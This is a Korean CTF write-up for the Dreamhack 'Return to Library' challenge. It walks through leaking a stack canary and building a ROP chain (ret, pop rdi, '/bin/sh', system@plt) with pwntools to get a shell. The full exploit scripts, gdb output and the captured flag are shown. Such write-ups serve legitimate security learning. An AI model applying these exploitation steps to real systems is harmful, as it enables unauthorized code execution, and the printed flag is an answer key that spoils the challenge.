https://honey-push-30b.notion.site/Return-to-library-78b5ba61d8984be6bf4d4580e30c7bdd
# PLT/GOT 설명 사이트

[https://bpsecblog.wordpress.com/2016/03/07/about_got_plt_1/](https://bpsecblog.wordpress.com/2016/03/07/about_got_plt_1/)

![plt,got 관계.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5e92c30c-1795-4de1-981b-034f57ef5e37/pltgot_%EA%B4%80%EA%B3%84.png)

# 문제파일 다운로드

![문제파일 다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/431e3572-7239-4384-b978-ac38b9892009/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC_%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C.png)

문제파일을 다운로드 받으면 rtl.c 소스코드 파일과 rtl파일을 획득할 수 있다. rtl.c 소스코드를 확인해 보자.

```c
// Name: rtl.c
// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

라이브러리 함수를 호출하는 것은 그 라이브러리 함수의 plt를 호출하는 것을 의미한다.

plt주소 를 호출(call)하면 plt가 실행되며 got(라이브러리 함수의 실제 주소가 적혀 있는 곳)를 찾는다.. 이 때 plt가 처음 호출된 거면 got에 라이브러리 함수 실제 주소가 적혀있지 않아서 찾는 과정을 거치지만 두번째 호출된거면 got에 라이브러리 함수의 실제 주소가 적혀있다.

즉 plt(got 주소 호출) → got(라이브러리 실제 함수 주소 호출) → 라이브러리 실제 함수

system 함수로 system 함수의 plt 주소를 echo로 출력해주며 system 함수를 한번 실행했으므로 이제 plt는 got로 점프가 가능하며 got에는 system 함수의 실제 주소가 저장되어있다. 

```c
gdb-peda$ checksec

CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

checksec 명령어를 통해 알아본 결과 CANARY 기법과 NX 보호기법이 적용되어 있는 것을 확인 할 수 있다. NX는 이미 내장되어 있는 함수인 system 을 실행시킬 것이므로 스택에 실행함수를 넣지 않을 것이기에 고려할 필요가 없고 CANARY 기법만 고려하면 된다. 

# 문제 접근

먼저 buf의 크기는 [0x30]임에도 불구하고 read함수로 읽어들이는 크기는 0x100으로 버퍼의 크기보다 더 많이 읽어들여서 버퍼오버플로우가 발생한다. 그리고 이를 이용해서 카나리 값을 추출해서 카나리를 우회해야 한다.

일단 카나리 위치를 알기 위해 gdb로 뜯어서 카나리 값을 가져와서 넣는 부분까지 가져왔다.

```python
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x00000000004006f7 <+0>:     push   rbp
   0x00000000004006f8 <+1>:     mov    rbp,rsp
   0x00000000004006fb <+4>:     sub    rsp,0x40
   0x00000000004006ff <+8>:     mov    rax,QWORD PTR fs:0x28
   0x0000000000400708 <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000040070c <+21>:    xor    eax,eax
```

rbp에서 0x40만큼 크기를 확보하고 rbp-0x8 위치에 카나리 값을 넣어주는 모습을 볼 수 있다. 

이 때 레지스터 값이랑 스택 상태를 좀더 자세히 보면 아래와 같다.

```python
RAX: 0x4e1c8621c3934600 (카나리 값)
RBP: 0x7fffffffdf80 --> 0x0
x/64x $rbp-0x40
-----------------------------------------------------------------------------------
0x7fffffffdf40: 0x0000000000000001      
0x7fffffffdf48: 0x000000000040083d
0x7fffffffdf50: 0x0000000000000000      
0x7fffffffdf58: 0x00000000004007f0
0x7fffffffdf60: 0x0000000000000000      
0x7fffffffdf68: 0x0000000000400610
0x7fffffffdf70: 0x00007fffffffe070      
0x7fffffffdf78: 0x4e1c8621c3934600
0x7fffffffdf80: 0x0000000000000000      
0x7fffffffdf88: 0x00007ffff7dfd81d
```

0x00007fffffffe070 값이 무엇인지는 모르겠지만 일단 카나리(0x4e1c8621c3934600)는 0x7fffffffdf78에 즉 rbp-0x08에 저장되어있는 것을 볼 수 있다.

![스택구조.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fc11a08b-a8ef-437b-98a5-e756f0067236/%EC%8A%A4%ED%83%9D%EA%B5%AC%EC%A1%B0.png)

이러한 형태의 스택 구조로 이루어져 있는것을 확인할 수 있다. 그러면 카나리값을 leak하려면 총 0x38바이트+0x1바이트인 0x39바이트를 넣어서 카나리 값을 얻어내면 된다. 

```python
from pwn import *

host="host3.dreamhack.games"
port=10252

p=remote(host,port)
canary_payload=b'A'*0x39

p.sendlineafter("Buf: ",canary_payload)
p.recvuntil(canary_payload)
canary=p64(u64(b'\x00'+p.recvn(7)))

```

그러면 카나리 값을 구하고 나면 어떻게 익스플로잇을 할까?

쉘을 얻는 것이 목적이므로 system(”/bin/sh”)를 실행시키면 된다. system 함수를 실행시킬 수 있는 이유는 코드에서 system("echo 'system@plt"); 가 존재해서 system@plt의 주소를 알 수 있으므로 system 함수를 호출할 수 있다. 

호출 규약에 따르면 x64 환경에서는 arg0이 rdi이다. 

![호출규약.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/22c66913-e6a3-40a5-bce6-83a59d944de4/%ED%98%B8%EC%B6%9C%EA%B7%9C%EC%95%BD.png)

즉 rdi에 (”/bin/sh”)를 넣고 system함수를 실행시켜주면 system(”/bin/sh”)가 실행된다. 이를 위해서는 pop rdi; ret의 가젯이 필요하다.

즉 주소를 덮어씌울때 다음과 같이 덮어씌워주면 익스플로잇이 가능하다.

pop rdi; ret의 주소

“/bin/sh”의 주소

system 함수의 plt 주소

그럼 pop rdi; ret 가젯을 찾기 위해서 ROPgadget을 사용하였다.

```python
┌──(root💀kali)-[~/바탕화면/return_to_library]
└─# ROPgadget --binary ./rtl --re "pop rdi"
Gadgets information
============================================================
0x0000000000400853 : pop rdi ; ret

Unique gadgets found: 1
```

--re 옵션을 이용하여 정규표현식으로 나오게 하였고 “pop rdi”가 포함된 가젯만 나오도록 하였다. 근데 이 옵션이 기억이 안나면 grep을 이용하는 방법도 있다.

```python
┌──(root💀kali)-[~/바탕화면/return_to_library]
└─# ROPgadget --binary ./rtl | grep "pop rdi"
0x0000000000400853 : pop rdi ; ret

```

그럼 이제 “/bin/sh”의 주소를 찾자

```python
const char* binsh = "/bin/sh";
```

코드 상에서 전역 변수로 “/bin/sh”가 존재하므로 일단 main에 브레이크 포인트를 건 후 실행한 상태에서 /bin/sh를 찾자.

```python
gdb-peda$ b *main
Breakpoint 1 at 0x4006f7
gdb-peda$ r
-------------------------------------------------
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 3 results, display max 3 items:
 rtl : 0x400874 --> 0x68732f6e69622f ('/bin/sh')
 rtl : 0x600874 --> 0x68732f6e69622f ('/bin/sh')
libc : 0x7ffff7f6e882 --> 0x68732f6e69622f ('/bin/sh')
```

rtl에서 bin/sh가 저장되어 있는 위치를 찾을 수 있다. 0x400874이다.

또한 ASLR이 걸려있어도 PIE가 적용되어있지 않으면 plt 주소는 고정되어 있으므로 elfsymbol을 이용해 plt 주소를 알아내어도 이 주소는 고정값이다. 

```python
gdb-peda$ elfsymbol
Found 6 symbols
puts@plt = 0x4005b0
__stack_chk_fail@plt = 0x4005c0
system@plt = 0x4005d0
printf@plt = 0x4005e0
read@plt = 0x4005f0
setvbuf@plt = 0x400600
```

이를 통해 system의 plt 주소는 0x4005d0임을 알 수 있다.

즉 아래와 같이 페이로드를 구성했다.

![페이로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c630c099-9a7b-4b36-8186-178fa435bcaf/%ED%8E%98%EC%9D%B4%EB%A1%9C%EB%93%9C.png)

그러면 이제 페이로드를 마저 작성해보자.

```python
from pwn import *

host="host3.dreamhack.games"
port=10252

p=remote(host,port)

canary_payload=b'A'*0x39

p.sendlineafter("Buf: ",canary_payload)
p.recvuntil(canary_payload)
canary=p64(u64(b'\x00'+p.recvn(7)))

pop_rdi=p64(0x400853)
bin_sh=p64(0x400874)
system_plt=p64(0x4005d0)
payload=b'A'*0x38+canary+b'A'*8
payload+=pop_rdi
payload+=bin_sh
payload+=system_plt

p.sendlineafter("Buf: ",payload)
p.interactive()
```

이렇게 작성한 결과 쉘을 획득하지 못했다. 

그 이유로는 [https://hackyboiz.github.io/2020/12/06/fabu1ous/x64-stack-alignment/](https://hackyboiz.github.io/2020/12/06/fabu1ous/x64-stack-alignment/) 에서 자세히 설명하고 있는데 64비트 환경의 경우 system함수 내부에서 movaps 명령어를 사용하기 때문에 stack을 0x10단위로 맞춰줘야 한다. 

Linux 64 [ABI](https://software.intel.com/sites/default/files/article/402129/mpx-linux64-abi.pdf) ( Application binary interface )에 따르면 프로그램의 흐름( control )이 함수의 entry로 옮겨지는 시점에선 스택 포인터(rsp)+8이 항상 16의 배수여야한다. 왜냐면 함수의 entry에서 push rbp를 해주기 때문에 스택에 8바이트만큼 값이 들어가서 이 때는 RSP+8이 0x10단위로 맞춰져야 하는 것이다. 

정상적인 코드에서는 알아서 이 64비트 환경에서 알아서 스택의 환경(stack alignment)을 꼭 맞춰줘야 할 때(SSE Instruction을 실행할 때는 맞춰져 있어야함) 는 맞춰주는데 우리는 BOF로 인해 정상적으로 함수를 호출하는 것이 아니기 때문에 system 함수에 있는 movaps(SSE Instruction)을 실행할 때 이 스택의 환경이 어긋나게 된 것이다.

CALL Instruction의 경우 스택의 RSP 값이 변화하게 되는데 CALL로 함수를 호출하면서 Stack Frame에 rbp값을 넣어주며 일시적으로 stack의 환경(stack alignment)가 0x10 단위가 깨지게 된다. 하지만 끝날 때 ret(pop rip, jmp rip)를 통해서 스택에서 값을 하나 pop 해주기 때문에 RSP값은 RSP+8이 된다.

즉 정리하면 stack alignment (0x10단위 맞춰주기)를 꼭 해줘야 할때가 SSE Instruction이 실행될 때인데 그 대표적인 instruction이 system 함수에 있는 movaps이다. 따라서 system 함수를 호출할때는 이 0x10단위를 맞춰주기를 해야하는데 그러려면 RSP 값을 조절을 해줘야 한다. 조절해 줄 수 있는 명령어는 CALL과 RET 두개가 있다 

CALL을 통해서 함수를 호출하면 스택 프레임 오프닝으로 인해서(push rbp) 내부적으로 RSP-8이 되었다가 그 함수가 종료되면서 RET(pop rip)를 통해 RSP+8이 된다. 즉 RET이 RSP값을 8만큼 늘려주는 역할을 하는 것이다.

- RET → RSP + 8

근데 우리가 BOF를 이용해서 할 때는 CALL을 이용해서 호출하는 것이 아닌 ret을 이용해서 함수를 호출해주는데 이렇게 함수를 호출해주고 나면 stack alignment가 깨지는 경우가 있다. 

우리가 짠 코드에서도 CALL을 이용해서 호출하는 것이 아닌 pop rdi; ret를 통해서 rdi값(”/bin/sh”)을 스택에서 빼주고 ret를 통해서 system@plt를 실행시켜준다. 그런데 이 때 stack alignment가 깨졌기 때문에 익스플로잇이 잘 안된다. 따라서 RSP 값을 +8해주기 위해 ret 가젯을 넣어준다.

(ret)

(pop rdi; ret)

의 형태로 스택에 넣어주면 첫번째 ret는 pop rip, jmp rip가 된다. 그럼 이 때 pop은 rsp+8의 위치인 (pop rdi; ret)의 주소가 되어 (pop rdi; ret)가 실행이 된다. 

즉 pop rdi; ret가 실행이 되는 것은 똑같으나 stack alignment를 맞춰주기 위해 즉 RSP+8을 해주기 위해 pop rdi; ret 가젯 위에 ret 가젯을 넣어준 것이다.

RET 가젯의 주소를 ROPgadget 명령어를 통해 알아내자.

![KakaoTalk_20220917_204605183.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6d1e974f-3ffa-4104-9cba-9841e77a0f45/KakaoTalk_20220917_204605183.png)

ret 가젯의 주소는 0x400285임을 확인할 수 있다. 이제 다시 익스 코드를 짜보자.

```python
from pwn import *

host="host3.dreamhack.games"
port=10252

p=remote(host,port)

canary_payload=b'A'*0x39

p.sendafter("Buf: ",canary_payload)
p.recvuntil(canary_payload)
canary=p64(u64(b'\x00'+p.recvn(7)))

print(hex(u64(canary)))

pop_rdi=p64(0x400853)
bin_sh=p64(0x400874)
system_plt=p64(0x4005d0)

payload=b'A'*0x38+canary+b'A'*8
payload += p64(0x400285) # ret
payload+=pop_rdi
payload+=bin_sh
payload+=system_plt

p.sendafter("Buf: ",payload)
p.interactive()
```

이 익스 코드를 실행해주면 쉘을 얻을 수 있다.

```python
┌──(root💀kali)-[~/바탕화면/return_to_library]
└─# python3 ./answer.py
[*] Switching to interactive mode
$ ls
flag
rtl
run.sh
$ cat flag
DH{13e0d0ddf0c71c0ac4410687c11e6b00}
$
```

플래그 값인 DH{13e0d0ddf0c71c0ac4410687c11e6b00}를 얻었다.
